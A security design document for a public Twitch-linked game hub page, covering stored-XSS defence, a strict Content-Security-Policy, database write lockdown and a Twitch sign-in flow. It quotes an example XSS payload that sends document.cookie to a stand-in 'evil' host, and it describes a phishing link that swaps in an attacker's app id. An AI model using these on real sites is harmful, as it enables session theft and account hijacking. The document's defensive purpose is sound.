# Viewer hub security - the rules, and why

The hub is a PUBLIC page carrying data that VIEWERS CONTROL. Hero names are Twitch display
names. Titles, epitaphs and chat-derived text are all attacker-controlled. Treat every string in
the snapshot as hostile input, because it is.

Mr. E's instruction, Nov 12: "lock it down so we don't get hackers or people trying to script in."

## The threat that actually matters: stored XSS

Nobody is going to break Postgres. The realistic attack is a viewer enlisting under the name

    <img src=x onerror=fetch('https://evil/'+document.cookie)>

which the game stores, publishes, and the hub renders. If the page writes that into the DOM as
HTML, every viewer who opens the hub runs that attacker's code. That is "people trying to script
in", and it is the one hole worth real paranoia.

We defend it TWICE: sanitize on the way in (W1a, the game) and escape on the way out (W1b, the
page). Either alone would probably do. Both means a mistake in one is not a breach.

## Layer 1 - the game, when it publishes (W1a, desktop)

- Strip control characters from every viewer-supplied string before it goes in the payload.
- Cap lengths: a display name is at most 25 characters, an epitaph at most 120. Twitch will not
  issue longer names; anything longer is someone probing.
- Never publish anything private. No Twitch user ids, no tokens, no emails, no IP addresses, no
  file paths. The hub is world-readable by design - assume it is scraped.
- The service key lives in user://supabase.json and NEVER in the repo. It bypasses RLS.

## Layer 2 - the page, when it renders (W1b)

- NEVER innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / new Function, or any
  framework raw-HTML escape hatch, for any value from the snapshot. textContent and
  createElement only. A hostile name must render as literal text.
- Content-Security-Policy meta tag, strict:
    default-src 'none'; connect-src https://paaukwaffaamazgrndbv.supabase.co; script-src 'self';
    style-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none';
    frame-ancestors 'none'
  No inline <script>, no inline style attributes - keep JS and CSS in their own files so
  'unsafe-inline' is never needed. The CSP is what saves us if rule 1 is ever broken by accident.
- No third-party scripts, fonts, analytics or CDNs. Every external script is someone else's
  security problem becoming ours.
- Never build a link, image src or iframe from snapshot data. Do not interpret any field as a URL.
- Read-only: no forms, no POST, no write calls of any kind.
- Fail closed: on a fetch error or an unexpected payload shape, show a plain message. Never render
  partial unvalidated data.

## What is already locked (verified, not assumed - supervisor, Nov 12 01:20)

- RLS is ON for public.snapshot with exactly ONE policy: select, to anon and authenticated.
- There is deliberately NO insert/update/delete policy, so only the service_role key can write.
- Table-level INSERT/UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER have been REVOKED from anon and
  authenticated. Supabase grants these by default; RLS was the only thing stopping writes, which
  meant one careless policy later would have opened a public write hole. Now it is refused twice.
- Default privileges in schema public no longer grant those to anon/authenticated either, so a
  future table does not quietly reopen it.
- Verified by test: a write with the publishable key is refused; a read with it succeeds; a write
  with the secret key succeeds.
- The publishable key is safe in the page and in this repo. The secret key is not, and is not here.

## The gate

The hub does not go public until its code has been read against this document - specifically
every place snapshot data reaches the DOM. "The brief said so" is not evidence. Publishing to
GitHub Pages is Mr. E's decision and happens after that review, not before.

## Later: phase 2 voting

Voting with Twitch login reopens all of this and adds CSRF, session handling and ballot stuffing.
None of it is in scope now. When it starts, this document gets a second half.

## Phase 2, H5 - the Twitch chat embed and the ONE CSP change (FLAG: supervisor review)

This is the first and only place the hub touches a third party. It is opt-in and the
CSP change is the minimum the official embed needs. Review this section before any republish.

### What was added
- A "Twitch chat" section with a **Load Twitch chat** button. Nothing from Twitch loads on
  page load. The iframe is created only when a viewer clicks the button (`loadTwitchChat()`).
- The iframe is the official chat embed, exactly per dev.twitch.tv/docs/embed/chat:
    https://www.twitch.tv/embed/<channel>/chat?parent=<host>
  - `<channel>` is the hard-coded constant `TWITCH_CHANNEL = "jestsayin96"` in app.js. It is
    NEVER built from snapshot data. No hero name / title / epitaph / any payload field goes
    anywhere near the URL.
  - `<host>` is `location.hostname` (this page's own domain), url-encoded. Not snapshot data.

### The CSP change (before -> after)
BEFORE:
  default-src 'none'; connect-src <supabase>; script-src 'self'; style-src 'self';
  img-src 'self' data:; font-src 'self'; base-uri 'none'; form-action 'none'
AFTER (one directive added):
  ... ; font-src 'self'; frame-src https://www.twitch.tv https://embed.twitch.tv; base-uri 'none'; ...

- The ONLY addition is `frame-src https://www.twitch.tv https://embed.twitch.tv` - two named
  Twitch hosts, no wildcard. `www.twitch.tv` is the documented chat-embed host; `embed.twitch.tv`
  covers the embed's own redirect. `default-src 'none'` still blocks every other frame.
- Nothing else changed. script-src / style-src / connect-src / img-src are untouched, so the
  embed cannot add scripts, styles, connections or images to THIS page.

### Why this is safe
- The iframe is a separate, cross-origin browsing context. Twitch's own page runs inside it under
  Twitch's origin and Twitch's own CSP; our `frame-src` only governs WHICH origins may be framed,
  not what runs inside the frame. Our page cannot read into the iframe and the iframe cannot read
  our DOM (same-origin policy).
- Opt-in means a viewer who never clicks never contacts Twitch at all - no third-party request,
  no third-party cookie, by default.
- The page stays strictly READ-ONLY. The embed sends no snapshot data anywhere; chatting happens
  inside Twitch's own iframe, under the viewer's own Twitch session, not through this page.
- All four original invariants are intact: snapshot strings still reach the DOM only via el();
  no snapshot value is a URL/src/href/style; the rest of the CSP is unchanged; the honest states
  and version gate are unchanged.

### What the supervisor should check before republishing
1. `frame-src` lists only the two Twitch hosts, no wildcard, and no other directive loosened.
2. `TWITCH_CHANNEL` is a constant; grep confirms no snapshot field is concatenated into the src.
3. The embed is opt-in (button-triggered) and absent in overlay mode.
If any of that is not true, do not republish.

## Phase 2, H6 - Twitch device-code sign-in SCAFFOLDING (FLAG: supervisor review; NEEDS MR. E)

Built so a viewer can spotlight THEIR OWN hero instead of scrolling. It is scaffolding: inert
until Mr. E registers a public client id. Review before any republish.

### Gated on Mr. E
- `TWITCH_CLIENT_ID` is a placeholder (empty). With no id, the "Sign in with Twitch" button only
  explains that it needs Mr. E and makes NO network call. The whole flow is dead code until the
  id is filled in. (A local test hook, ?twitch_client=..., can set it for testing only; it is
  never baked into the repo.)

### The flow (OAuth 2.0 device grant, when enabled)
1. POST id.twitch.tv/oauth2/device (client_id) -> device_code + user_code + verification_uri.
2. Show the viewer the user_code and the twitch.tv/activate link; they enter it on Twitch.
3. Poll id.twitch.tv/oauth2/token until an access_token comes back.
4. GET api.twitch.tv/helix/users with the token -> the viewer's own login.
5. Match that login to a hero in the snapshot and spotlight that card.

### The CSP change (the second and last one)
- connect-src gains `https://id.twitch.tv https://api.twitch.tv` (two named hosts, no wildcard),
  alongside the existing Supabase origin. Needed for steps 1, 3 and 4. Inert today (gated).
- No other directive changes. Supabase remains the only DATA origin; frame-src (H5) is separate.

### Why this stays safe and READ-ONLY
- The access token is the VIEWER'S OWN. It is held in a memory variable for the session only -
  never written to localStorage/sessionStorage, never sent to our Supabase backend, never used
  to write anything anywhere. It is used for exactly one read: the viewer's own login name.
- No scopes are requested (TW_SCOPES is empty) - the default grant is enough to read the user's
  own login, nothing more.
- The verification_uri is taken from Twitch's OAuth response (not the snapshot) and is set as a
  link href ONLY after it is checked to be a twitch.tv URL; otherwise it is shown as plain text.
- The snapshot path is untouched: no payload value is ever used in any Twitch URL, header or body.
  Matching a hero is a read of the already-rendered data by name.
- The page still performs NO viewer write to any backend. Writes remain a Phase-3 decision gated
  on an RLS design.

### What the supervisor should check before republishing
1. connect-src lists only Supabase + the two Twitch hosts, no wildcard; no other directive loosened.
2. TWITCH_CLIENT_ID ships empty (gated); grep confirms the flow is dead without it.
3. The token is never persisted (no localStorage/sessionStorage) and never sent to Supabase.
4. No scopes requested; the token reads only the user's own login.
If any of that is not true, do not republish. The token step is Mr. E's to enable (register the app).

## The client id is fixed in the page - never overridable at runtime (supervisor, Nov 12)

`TWITCH_CLIENT_ID` is a `const` baked into app.js (the Bellmire Hub Login app: PUBLIC client,
device-code grant, no scopes). It must NEVER be settable from a URL parameter, localStorage, the
snapshot, or any other runtime source.

A `?twitch_client=` test hook existed while the id was empty and the page unpublished. It was
REMOVED before login went live, because on a public page it is an account-phishing vector:

    .../Bellmire-HD-stream/?twitch_client=<attacker app id>

A viewer following that link clicks "Sign in with Twitch" on a page that looks like ours, is shown
a device code, enters it at the real twitch.tv, and thereby authorizes the ATTACKER'S application
against their own Twitch account. Our empty TW_SCOPES caps the damage, but the viewer still ends up
with a stranger's app connected to their account, authorized through Mr. E's branding.

Do not re-add that hook. To test the flow against another id, edit the const locally and do not
commit it.
